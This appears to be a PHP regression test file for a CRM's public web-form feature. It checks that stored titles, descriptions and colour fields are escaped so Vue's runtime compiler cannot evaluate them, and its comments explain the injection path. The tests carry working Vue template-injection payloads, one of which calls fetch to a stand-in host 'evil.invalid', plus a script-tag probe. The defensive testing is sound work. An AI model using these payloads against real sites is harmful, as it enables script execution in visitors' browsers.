<?php

use Illuminate\Foundation\Testing\DatabaseTransactions;
use Webkul\WebForm\Models\WebForm;
use Webkul\WebForm\Providers\WebFormServiceProvider;

/**
 * Only the `#v-web-form-template` block is compiled by Vue. The same value also reaches the
 * document `<title>`, where a mustache is inert because nothing compiles it, so the assertions
 * below look at the compiled block alone rather than at the whole page.
 */
function compiledTemplate(string $html): string
{
    $start = strpos($html, 'id="v-web-form-template"');

    if ($start === false) {
        return '';
    }

    $end = strpos($html, '</script>', $start);

    return substr($html, $start, $end === false ? null : $end - $start);
}

/**
 * The public web form is rendered into a `<script type="text/template">` block that Vue compiles at
 * runtime (`vue/dist/vue.esm-bundler`), so stored strings placed in it are parsed as template
 * source rather than as text. Blade's escaping does not help: it leaves `{{` and `}}` untouched and
 * Vue decodes the entities it produces, so a form title of
 * `{{constructor.constructor('...')()}}` became a JavaScript expression evaluated in the browser of
 * every visitor to the public form, every admin opening the preview, and — because the embed script
 * ships the same markup through `document.write` — every third-party site hosting the form.
 *
 * Any CRM user holding the web-forms create or edit permission can store these values, so this is
 * reachable without super-admin.
 */
uses(DatabaseTransactions::class);

function makeInjectedWebForm(array $overrides = []): WebForm
{
    return WebForm::create(array_merge([
        'form_id' => bin2hex(random_bytes(8)),
        'title' => 'Contact us',
        'description' => 'Tell us about your project.',
        'submit_button_label' => 'Send',
        'submit_success_action' => 'message',
        'submit_success_content' => 'Thanks.',
        'create_lead' => 1,
    ], $overrides));
}

it('neutralises vue interpolation delimiters while leaving the text readable', function () {
    $payload = '{{constructor.constructor(\'fetch("https://evil.invalid")\')()}}';

    $escaped = WebFormServiceProvider::escapeVueTemplate($payload);

    expect($escaped)->not->toContain('{{');
    expect($escaped)->not->toContain('}}');

    // The characters still render as themselves for a reader.
    expect($escaped)->toContain('&#123;&#123;');
    expect($escaped)->toContain('&#125;&#125;');
});

it('still escapes html so the value cannot break out of the template', function () {
    $escaped = WebFormServiceProvider::escapeVueTemplate('<script>alert(1)</script>');

    expect($escaped)->not->toContain('<script>');
    expect($escaped)->toContain('&lt;script&gt;');
});

it('leaves an ordinary title untouched', function () {
    expect(WebFormServiceProvider::escapeVueTemplate('Request a demo'))->toBe('Request a demo');
});

it('does not render a live vue expression from a stored form title', function () {
    $webForm = makeInjectedWebForm([
        'title' => '{{constructor.constructor(\'window.__pwned=1\')()}}',
    ]);

    $response = test()->get('/web-forms/forms/'.$webForm->form_id.'/form.html');

    expect($response->getStatusCode())->toBe(200);

    /**
     * The compiler only treats `{{ ... }}` as an expression; the entity form is inert.
     */
    $template = compiledTemplate($response->getContent());

    expect($template)->not->toContain('{{constructor.constructor');
    expect($template)->toContain('&#123;&#123;constructor.constructor');
});

it('does not render a live vue expression from a stored form description', function () {
    $webForm = makeInjectedWebForm([
        'description' => '{{constructor.constructor(\'window.__pwned=1\')()}}',
    ]);

    $response = test()->get('/web-forms/forms/'.$webForm->form_id.'/form.html');

    $template = compiledTemplate($response->getContent());

    expect($template)->not->toContain('{{constructor.constructor');
    expect($template)->toContain('&#123;&#123;constructor.constructor');
});

/**
 * The colour fields carry no format validation and sit inside the same compiled block, so they are
 * the same sink as the title.
 */
it('does not render a live vue expression from a stored colour field', function () {
    $webForm = makeInjectedWebForm([
        'form_title_color' => '{{constructor.constructor(\'window.__pwned=1\')()}}',
    ]);

    $response = test()->get('/web-forms/forms/'.$webForm->form_id.'/form.html');

    $template = compiledTemplate($response->getContent());

    expect($template)->not->toContain('{{constructor.constructor');
});

it('still shows an ordinary title on the rendered form', function () {
    $webForm = makeInjectedWebForm(['title' => 'Request a demo']);

    $response = test()->get('/web-forms/forms/'.$webForm->form_id.'/form.html');

    expect($response->getStatusCode())->toBe(200);

    expect($response->getContent())->toContain('Request a demo');
});
